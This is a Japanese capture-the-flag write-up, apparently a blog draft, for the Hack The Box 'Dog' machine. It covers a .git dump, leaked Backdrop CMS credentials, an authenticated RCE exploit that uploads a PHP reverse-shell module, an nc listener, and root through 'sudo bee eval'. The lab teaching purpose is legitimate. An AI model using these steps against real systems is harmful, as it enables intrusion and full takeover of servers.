+++
author = "Hugo Authors"
title = "HTB Dog"
date = "2025-06-01"
description = ""
tags = [
    "HTB",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
draft = true
+++

HTB Dogのメモ．
<!--more-->

## User Flag

```
nmap -Pn -T4 -sV -sC -A 10.10.11.58
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-02 07:20 JST
Nmap scan report for 10.10.11.58
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/2%OT=22%CT=1%CU=38122%PV=Y%DS=2%DC=T%G=Y%TM=683CD
OS:244%P=x86_64-pc-linux-gnu)SEQ(SP=F3%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST
OS:11NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   374.50 ms 10.10.16.1
2   193.14 ms 10.10.11.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.24 seconds
```

Webサイトがあるので，アクセスしたのち，ディレクトリを探索．

```
ffuf -w wordlists.txt -u http://10.10.11.58/FUZZ                  
                                                                                             
        /'___\  /'___\           /'___\                                                      
       /\ \__/ /\ \__/  __  __  /\ \__/                                                      
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                     
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                     
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.58/FUZZ
 :: Wordlist         : FUZZ: /home/krimm/HTB/wordlists.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 187ms]
.git/                   [Status: 200, Size: 2877, Words: 192, Lines: 27, Duration: 188ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 211ms]
.git                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 366ms]
.git/logs/HEAD          [Status: 200, Size: 230, Words: 12, Lines: 2, Duration: 362ms]
.git/logs/              [Status: 200, Size: 1130, Words: 77, Lines: 18, Duration: 362ms]
.git/logs/refs          [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 340ms]
.ht_wsr.txt             [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 194ms]
.htaccess.BAK           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 190ms]
.htaccess-dev           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 197ms]
.htaccess-local         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 192ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 192ms]
.htaccess-marco         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 343ms]
.htaccess_orig          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 222ms]
.htaccess.orig          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 388ms]
.htaccess.save          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 243ms]
.htaccessOLD2           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 221ms]
.htpasswd_test          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 212ms]
.htaccess_extra         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 243ms]
.htpasswds              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 212ms]
.htpasswd-old           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 214ms]
.htaccess_sc            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 230ms]
.htgroup                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 215ms]
.htaccess~              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 223ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 215ms]
.htaccess.bak1          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 396ms]
.htaccessBAK            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 229ms]
.htaccess.old           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 397ms]
.htaccessOLD            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 231ms]
.httr-oauth             [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 215ms]
.htaccess.bak           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 399ms]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 396ms]
.htaccess.sample        [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 548ms]
.htusers                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 445ms]
.git/index              [Status: 200, Size: 344667, Words: 814, Lines: 3250, Duration: 186ms]
files/                  [Status: 200, Size: 1954, Words: 122, Lines: 22, Duration: 197ms]
index.php               [Status: 200, Size: 13332, Words: 1368, Lines: 202, Duration: 322ms]
layouts/                [Status: 200, Size: 938, Words: 61, Lines: 17, Duration: 249ms]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 209ms]
modules/                [Status: 200, Size: 742, Words: 52, Lines: 16, Duration: 188ms]
README.md               [Status: 200, Size: 5285, Words: 596, Lines: 116, Duration: 185ms]
robots.txt              [Status: 200, Size: 1198, Words: 114, Lines: 47, Duration: 358ms]
server-status/          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 218ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 222ms]
settings.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 236ms]
shell.sh                [Status: 200, Size: 71, Words: 7, Lines: 1, Duration: 215ms]
simple-backdoor.php     [Status: 200, Size: 171, Words: 20, Lines: 7, Duration: 195ms]
themes/                 [Status: 200, Size: 936, Words: 61, Lines: 17, Duration: 233ms]
themes                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 234ms]
:: Progress: [5365/5365] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

`.git/`があるので，[GitHack](https://github.com/lijiejie/GitHack)を用いて，ファイルをダウンロード．

GitHack:  
https://github.com/lijiejie/GitHack

```
$ python GitHack.py http://10.10.11.58/.git/
```

ダウンロードしたファイル（10.10.11.58フォルダ）から情報を探す．

```
$ grep -r "database" ./10.10.11.58 | grep "root"                                   
./10.10.11.58/core/scripts/install.sh:--db-url=mysql://root:pass@127.0.0.1/db   A database URL. Only required for initial install - not re-install.
./10.10.11.58/core/includes/install.core.inc:  $settings_php = st('To install to a different database, edit the <em>settings.php</em> file located in the root folder of this site.');
./10.10.11.58/sites/README.md:root directory. Each site will always have a different database, configuration,
./10.10.11.58/settings.php:$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

```
$ grep -r "dog.htb" ./10.10.11.58
./10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

ユーザ名：`tiffany@dog.htb`，パスワード：`BackDropJ2024DS2024`と特定．

ログインすると，Backdrop CMS の Dashboard が表示された．

[]()

Functionality > List modules から Backdrop CMS のバージョンは1.27.1と確認．

[]()


```
$ searchsploit backdrop cms 1.27.1                                                         
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Backdrop CMS 1.27.1 - Authenticated Remote Command Executi | php/webapps/52021.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)  
https://www.exploit-db.com/exploits/52021

上記攻撃コードを`Backdrop CMS 1.27.1.py`で保存し，実行．

```
$ python "Backdrop CMS 1.27.1.py" http://10.10.11.58/                                         
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58//modules/shell/shell.php
```

実行すると，`shell`フォルダとその中に`shell.info`と`shell.php`が作成されている．

`shell.php`を，IPアドレスとポートを書き替えた[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)に置き換える．

> Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation.

の通りに進めると，拡張子`.tar.gz`が要求されたため，以下で変換しアップロード．

```
$ tar -cvzf shell.tar.gz shell
shell/
shell/shell.php
shell/shell.info
```

ncで待ち受けて，`http://10.10.11.58//modules/shell/shell.php`にアクセスすると，シェルを取得できる．

```
$ nc -lvvp 4444                                                                               
listening on [any] 4444 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.11.58] 46492
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 23:05:54 up 19:07,  1 user,  load average: 7.46, 7.21, 7.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
johncusa pts/6    10.10.14.181     21:07    1:37m  0.48s  0.03s sshd: johncusack [priv]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@dog:/$ cd home
www-data@dog:/home$ ls
jobert
johncusack
www-data@dog:/home$ ls jobert
www-data@dog:/home$ ls johncusack
user.txt

www-data@dog:/home$ su johncusack
su johncusack
Password: BackDropJ2024DS2024

johncusack@dog:~$ ls
ls
user.txt
johncusack@dog:~$ cat user.txt
cat user.txt
82e7bd8fefd583b5c731ea610b529301
```

## Privilege escalation

```
johncusack@dog:~$ sudo -l
sudo -l
[sudo] password for johncusack: BackDropJ2024DS2024

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
johncusack@dog:~$ bee
bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).


Commands:
 CONFIGURATION
  config-export
   cex, bcex
   Export config from the site.

  config-get
   cget
   Get the value of a specific config option, or view all the config options in a given file.

  config-import
   cim, bcim
   Import config into the site.

  config-set
   cset
   Set the value of an option in a config file.

 CORE
  download-core
   dl-core
   Download Backdrop core.

  install
   si, site-install
   Install Backdrop and setup a new site.

 DATABASE
  db-drop
   sql-drop
   Drop the current database and recreate an empty database with the same details. This could be used prior to import if the target database has more tables than the source database.

  db-export
   dbex, db-dump, sql-export, sql-dump
   Export the database as a compressed SQL file. This uses the --no-tablespaces option by default.

  db-import
   dbim, sql-import
   Import an SQL file into the current database.

 INFORMATION
  help
   Provide help and examples for 'bee' and its commands.

  log
   ws, dblog, watchdog-show
   Show database log messages.

  status
   st, info, core-status
   Provides an overview of the current Backdrop installation/site.

  version
   Display the current version of Bee.

 MISCELLANEOUS
  cache-clear
   cc
   Clear a specific cache, or all Backdrop caches.

  cron
   Run cron.

  maintenance-mode
   mm
   Enable or disable maintenance mode for Backdrop.

 PROJECTS
  disable
   dis, pm-disable
   Disable one or more projects (modules, themes, layouts).

  download
   dl, pm-download
   Download Backdrop contrib projects.

  enable
   en, pm-enable
   Enable one or more projects (modules, themes, layouts).

  projects
   pml, pmi, project, pm-list, pm-info
   Display information about available projects (modules, themes, layouts).

  uninstall
   pmu, pm-uninstall
   Uninstall one or more modules.

 ROLES
  permissions
   pls, permissions-list
   List all permissons of the modules.

  role-add-perm
   rap
   Grant specified permission(s) to a role.

  role-create
   rcrt
   Add a role.

  role-delete
   rdel
   Delete a role.

  role-remove-perm
   rrp
   Remove specified permission(s) from a role.

  roles
   rls, roles-list
   List all roles with the permissions.

 STATE
  state-get
   sg, sget
   Get the value of a Backdrop state.

  state-set
   ss, sset
   Set the value of an existing Backdrop state.

 THEMES
  theme-admin
   admin-theme
   Set the admin theme.

  theme-default
   default-theme
   Set the default theme.

 UPDATE
  update-db
   updb, updbst, updatedb, updatedb-status
   Show, and optionally apply, all pending database updates.

 USERS
  user-add-role
   urole, urol
   Add role to user.

  user-block
   ublk
   Block a user.

  user-cancel
   ucan
   Cancel/remove a user.

  user-create
   ucrt
   Create a user account with the specified name.

  user-login
   uli
   Display a login link for a given user.

  user-password
   upw, upwd
   Reset the login password for a given user.

  user-remove-role
   urrole, urrol
   Remove a role from a user.

  user-unblock
   uublk
   Unblock a user.

  users
   uls, user-list
   List all user accounts.

 ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```



```
root.txtjohncusack@dog:~$ sudo bee --root=/var/www/html eval "echo exec('/bin/bash');"
<--root=/var/www/html eval "echo exec('/bin/bash');"
root@dog:/var/www/html# cd
cd
root@dog:~# cd /root   
cd /root
root@dog:~# cat root.txt
cat root.txt
root@dog:~# exit
exit
exit
9dc8f051f0b303ef03150b21422d3154johncusack@dog:~$
```

参考：
https://www.cnblogs.com/QiSamaQwQ/p/18792481